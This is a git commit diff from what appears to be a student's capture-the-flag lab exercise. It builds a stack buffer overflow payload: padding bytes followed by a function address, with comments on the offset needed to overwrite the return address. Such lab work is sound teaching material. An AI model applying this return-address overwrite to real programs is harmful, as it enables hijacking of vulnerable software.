27f39bcc5ad6a7013d865263532e7675832fdd09
ebielawa <edward_bielawa@brown.edu>
2022-10-04 19:47:28 -0400

    Payload Flag 1

--- ctf-1/exp0.c
+++ ctf-1/exp0.c
@@ -12,8 +12,13 @@
 
 /* FIXME */
 unsigned char payload[] =
-	"HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHA";
-	//
+	{'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
+	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
+	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
+	'H', 'A', 'H', 'A', 'H', 'A', 'H', 'A',
+	0x4b, 0x72, 0x88, 0x0c};
+	//0x0c88724b is memory address of flag 1 function
+	// Need 24 (to reach rbp) plus 4 bytes (28 total) to overwrite into return address
 
 int
 main(int argc, char **argv)
